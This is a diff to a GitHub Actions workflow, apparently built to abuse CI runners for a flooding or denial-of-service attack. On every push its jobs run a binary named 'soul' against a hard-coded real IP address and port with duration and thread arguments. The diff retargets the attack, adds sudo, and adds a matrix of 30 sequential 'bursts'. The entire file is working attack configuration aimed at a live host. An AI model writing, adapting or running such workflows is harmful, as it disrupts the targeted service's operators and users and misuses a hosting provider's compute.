@@ -1,7 +1,8 @@
-name: attack
+name: soulcrack fucker
 on: [push]
 
 jobs:
+
   stage-0:
     runs-on: ubuntu-22.04
     strategy:
@@ -10,7 +11,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x soul
-      - run: ./soul 20.204.39.212 29844 10 400
+      - run: ./soul 74.225.211.225 20221 10 400
 
   stage-1:
     needs: stage-0
@@ -21,4 +22,31 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x soul
-      - run: ./soul 20.204.39.212 29844 300 400
+      - run: sudo ./soul 74.225.211.225 20221 300 400
+
+  stage-2-calc:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix_list: ${{ steps.calc.outputs.matrix_list }}
+    steps:
+      - id: calc
+        run: |
+          
+          NUM_JOBS=$((300 / 10))
+          
+          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
+          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
+
+  stage-2-sequential:
+    needs: [stage-0, stage-2-calc]
+    runs-on: ubuntu-22.04
+    strategy:
+      max-parallel: 1
+      matrix:
+        iteration: ${{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}
+    steps:
+      - uses: actions/checkout@v3
+      - name: Sequential 10s Burst
+        run: |
+          chmod +x soul
+          ./soul 74.225.211.225 20221 10 400
